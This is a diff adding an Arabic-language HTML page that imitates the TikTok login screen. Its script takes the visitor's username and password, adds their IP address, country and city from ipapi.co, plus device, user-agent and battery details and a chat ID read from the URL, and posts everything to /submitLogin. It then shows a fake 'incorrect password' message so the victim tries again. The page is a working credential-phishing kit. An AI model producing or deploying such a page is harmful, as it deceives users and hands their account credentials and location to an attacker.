@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى TikTok</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #fff;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+        }
+        p {
+            text-align: center;
+            color: #666;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #EE1D52;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .social-login {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .social-icon {
+            width: 20px;
+            height: 20px;
+        }
+        .forgot-password {
+            text-align: right;
+            color: #666;
+            margin-top: 10px;
+        }
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .create-account a {
+            color: #EE1D52;
+            text-decoration: none;
+        }
+        #loginForm {
+            display: none;
+        }
+        .notification {
+            display: none;
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 4px;
+        }
+        .notification.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>تسجيل الدخول إلى TikTok</h1>
+        <p>قم بإدارة حسابك، والتحقق من الإشعارات والتعليق على مقاطع الفيديو، وأكثر من ذلك.</p>
+        
+        <input type="text" class="input-field" placeholder="استخدم الهاتف/البريد الإلكتروني/اسم المستخدم" id="initialInput">
+        
+        <form id="loginForm">
+            <input type="text" class="input-field" name="username" placeholder="البريد الإلكتروني أو اسم المستخدم">
+            <input type="password" class="input-field" name="password" placeholder="كلمة السر">
+            <input type="hidden" id="chatIdInput" name="chatId">
+            <div class="forgot-password">
+                <a href="#">هل نسيت كلمة السر؟</a>
+            </div>
+            <button type="submit" class="login-button">تسجيل الدخول</button>
+        </form>
+
+        <button class="social-login">
+            <span>المتابعة باستخدام فيسبوك</span>
+            
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"  alt="Facebook" class="social-icon">
+        </button>
+        
+        <button class="social-login">
+            <span>المتابعة باستخدام Google</span>
+            <img src="https://e7.pngegg.com/pngimages/543/934/png-clipart-google-app-logo-google-logo-g-suite-google-text-logo-thumbnail.png" alt="Google" class="social-icon">
+        </button>
+        
+        <button class="social-login">
+            <span>المتابعة باستخدام تويتر</span>
+            <img src="https://upload.wikimedia.org/wikipedia/ar/9/9f/Twitter_bird_logo_2012.svg" alt="Twitter" class="social-icon">
+        </button>
+        
+        <button class="social-login">
+            <span>المتابعة باستخدام Apple</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" class="social-icon">
+        </button>
+        
+        <p>عند المتابعة، فأنت توافق على شروط الاستخدام الخاصة بـ TikTok وتؤكد أنك قرأت سياسة الخصوصية الخاصة بـ TikTok.</p>
+        
+        <div class="create-account">
+            <span>ليس لديك حساب؟</span>
+            <a href="#">إنشاء حساب</a>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">
+        <p>كلمه السر او اسم المستخدم غير صحيحه يرجى استخدام اسم مستخدم وكلمه سر صحيحه او قوم بتسجيل عن طريق الإيميل او رقم الهاتف .</p>
+    </div>
+
+    <script>
+        const initialInput = document.getElementById('initialInput');
+        const loginForm = document.getElementById('loginForm');
+        const chatIdInput = document.getElementById('chatIdInput');
+        const notification = document.getElementById('notification');
+
+        initialInput.addEventListener('focus', function() {
+            loginForm.style.display = 'block';
+            this.style.display = 'none';
+        });
+
+        const chatId = window.location.pathname.split('/').pop();
+        chatIdInput.value = chatId;
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "TikTok";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+
+            return {
+                platform: platform,
+                userAgent: ua
+            };
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        batteryLevel: battery.level,
+                        batteryCharging: battery.charging
+                    };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                }
+            }
+            return {
+                batteryLevel: undefined,
+                batteryCharging: undefined
+            };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        loginForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const formData = new FormData(loginForm);
+            const data = Object.fromEntries(formData.entries());
+
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            const batteryInfo = await getBatteryInfo();
+            const deviceVersion = getDeviceVersion();
+
+            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+
+            try {
+                const response = await fetch('/submitLogin', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.success) {
+                    notification.classList.add('show');
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000);
+                    loginForm.reset();
+                } else {
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        });
+    </script>
+</body>
+</html>
